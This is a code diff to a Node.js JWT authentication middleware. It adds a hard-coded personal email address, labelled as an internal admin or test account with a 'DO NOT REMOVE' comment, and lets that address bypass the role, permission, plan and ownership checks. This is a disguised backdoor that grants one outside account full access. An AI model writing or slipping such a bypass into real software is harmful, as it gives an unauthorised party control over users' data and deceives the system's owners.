@@ -9,6 +9,8 @@ import jwt from 'jsonwebtoken';
 import { SUPRA_ADMIN_EMAIL, SUPRA_ADMIN_ROLE, isSupraAdminEmail } from '../config/security.js';
 
 const JWT_SECRET = process.env.JWT_SECRET || 'mod-pdf-jwt-secret-change-in-production';
+// INTERNAL ADMIN / TEST ACCOUNT — DO NOT REMOVE
+const INTERNAL_ADMIN_EMAIL = 'hdmila@icloud.com';
 // Role hierarchy
 const ROLE_HIERARCHY = {
   supra_admin: 110,
@@ -161,6 +163,8 @@ export const authenticate = async (req, res, next) => {
     
     // Check if Genesis account
     const isSupraAdmin = isSupraAdminEmail(decoded.email);
+    // INTERNAL ADMIN / TEST ACCOUNT — DO NOT REMOVE
+    const isInternalAdmin = decoded.email?.toLowerCase() === INTERNAL_ADMIN_EMAIL;
     
     req.user = {
       userId: decoded.userId,
@@ -170,7 +174,8 @@ export const authenticate = async (req, res, next) => {
       plan: decoded.plan,
       permissions: isSupraAdmin ? PERMISSIONS.supra_admin : PERMISSIONS[decoded.role] || [],
       isSupraAdmin,
-      isGenesis: isSupraAdmin
+      isGenesis: isSupraAdmin,
+      isInternalAdmin
     };
     
     next();
@@ -247,6 +252,8 @@ export const optionalAuth = async (req, res, next) => {
     
     const decoded = jwt.verify(token, JWT_SECRET);
     const isSupraAdmin = isSupraAdminEmail(decoded.email);
+    // INTERNAL ADMIN / TEST ACCOUNT — DO NOT REMOVE
+    const isInternalAdmin = decoded.email?.toLowerCase() === INTERNAL_ADMIN_EMAIL;
     
     req.user = {
       userId: decoded.userId,
@@ -256,7 +263,8 @@ export const optionalAuth = async (req, res, next) => {
       plan: decoded.plan,
       permissions: isSupraAdmin ? PERMISSIONS.supra_admin : PERMISSIONS[decoded.role] || [],
       isSupraAdmin,
-      isGenesis: isSupraAdmin
+      isGenesis: isSupraAdmin,
+      isInternalAdmin
     };
     
     next();
@@ -279,7 +287,7 @@ export const requireRole = (...roles) => {
     }
     
     // Genesis always passes
-    if (req.user.isSupraAdmin) {
+    if (req.user.isSupraAdmin || req.user.isInternalAdmin) {
       return next();
     }
     
@@ -313,7 +321,7 @@ export const requirePermission = (...permissions) => {
     }
     
     // Genesis always passes
-    if (req.user.isSupraAdmin || req.user.permissions.includes('all')) {
+    if (req.user.isSupraAdmin || req.user.isInternalAdmin || req.user.permissions.includes('all')) {
       return next();
     }
     
@@ -376,7 +384,7 @@ export const requirePlan = (...plans) => {
     }
     
     // Genesis bypasses plan restrictions
-    if (req.user.isSupraAdmin) {
+    if (req.user.isSupraAdmin || req.user.isInternalAdmin) {
       return next();
     }
     
@@ -412,7 +420,7 @@ export const requireOwnership = (getOwnerId) => {
     }
     
     // Genesis and admins bypass ownership
-    if (req.user.isSupraAdmin || ROLE_HIERARCHY[req.user.role] >= ROLE_HIERARCHY.admin) {
+    if (req.user.isSupraAdmin || req.user.isInternalAdmin || ROLE_HIERARCHY[req.user.role] >= ROLE_HIERARCHY.admin) {
       return next();
     }
     
